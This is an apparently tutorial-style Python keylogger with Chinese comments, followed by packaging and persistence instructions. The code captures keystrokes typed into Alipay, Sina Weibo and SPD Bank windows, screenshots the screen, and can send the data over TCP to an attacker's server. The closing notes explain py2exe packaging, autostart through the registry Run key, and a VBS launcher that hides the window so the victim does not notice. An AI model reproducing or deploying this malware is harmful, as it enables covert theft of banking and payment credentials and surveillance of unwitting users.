# -*- coding: utf-8 -*- # 

#一、代码部分：获取用户输入信息，并与截图一起保存到XX目录下
 
import pythoncom 
import pyHook    
import time
import socket
from PIL import ImageGrab
 
#
#如果是远程监听某个目标电脑，可以自己架设一个服务器，然后将获取到的信息发回给服务器
#
def send_msg_to_server(msg):
    host=""
    port=1234
    buf_size=1024
    addr=(host,port)
    if len(msg)>0:
        tcp_client_sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        tcp_client_sock.connect(addr)
        info=time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))+' from '+socket.gethostname()+':'
        tcp_client_sock.sendall(info+msg)
        tcp_client_sock.close()
         
#
#也可以将获取到的信息保存到本地文件下
#
def write_msg_to_txt(msg):    
    f=open('D:/workspace/mytest/pyhook/media/monitor.txt','a')
    f.write(msg+'\r\n')
    f.close()
 
def onMouseEvent(event): 
    # 监听鼠标事件     
    global MSG
    if len(MSG)!=0:        
        #send_msg_to_server(MSG)
        write_msg_to_txt(MSG)
        MSG=''
        pic_name = time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))
        #将用户屏幕截图，保存到本地某个目录下（也可以搞成远程发送到自己的服务器）
        pic = ImageGrab.grab()
        pic.save('D:/workspace/mytest/pyhook/media/mouse_%s.png' % pic_name)
    return True
   
def onKeyboardEvent(event):
    #监听键盘事件
    global MSG
    title= event.WindowName.decode('GBK')
    #通过网站title，判断当前网站是否是“监听目标”
    if title.find(u"支付宝") != -1 or title.find(u'新浪微博')!=-1 or title.find(u'浦发银行')!=-1:
        #Ascii:  8-Backspace , 9-Tab ,13-Enter 
        if (127 >= event.Ascii > 31) or (event.Ascii == 8):
            MSG += chr(event.Ascii)               
        if (event.Ascii == 9) or (event.Ascii == 13):            
            #send_msg_to_remote(MSG)
            write_msg_to_txt(MSG)
            MSG = '' 
            #屏幕抓图实现
            pic_name = time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))
            pic = ImageGrab.grab()
            #保存成为以日期命名的图片
            pic.save('D:/workspace/mytest/pyhook/media/keyboard_%s.png' % pic_name)
    return True
  
if __name__ == "__main__":     
    MSG = ''   
    #创建hook句柄
    hm = pyHook.HookManager()
 
    #监控鼠标
    hm.SubscribeMouseLeftDown(onMouseEvent)
    hm.HookMouse()
 
    #监控键盘
    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard()
 
    #循环获取消息
    pythoncom.PumpMessages() 

'''
二、用py2exe将脚本打包：
    新建一个py文件setup.py，内容如下：
    from distutils.core import setup
    import py2exe
    setup(console=["monitor.py"])
    #setup(windows=["monitor.py"])
 
    命令行执行以下命令：
    python setup.py py2exe
    
三、将该程序设置为开机自动启动：
    法①：
    将需要开机启动的文件（创建一个快捷方式，然后）放到“开始/所有程序/启动”目录下
    法②：
    修改注册表：命令行— regedit ，然后到以下路径下：
    [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]   
 
    新建一个“字符串值”，然后编辑：设置exe文件所在路径
    D:\workspace\mytest\pyhook\dist\monitor.exe
    
   （以上两种方式启动monitor.exe的话，会弹出一个命令框，显示监听日志信息，这样的话，被监听的人一下就能发现了，可以试试下面这个方式）
    法③：
    新建一个 .vbs文件，内容如下：
    set wscriptObj = CreateObject("Wscript.Shell")
    wscriptObj.run “D:\workspace\mytest\pyhook\dist\monitor.exe",0
 
    双击运行该vbs文件，则monitor.exe就在后台启动了（不会弹出一个大黑框）。
    然后参考法①、② 把该vbs设置成开机启动即可。
 
附言：
1、该程序涉及到一些模块都需要自己安装一下；
2、文章中凡是“D:\workspace....”这样的路径都需要改成自己的真实路径；
3、代码仅供分享、学习，请勿干非法的事；
4、我也是初学，所以请随便喷；
'''
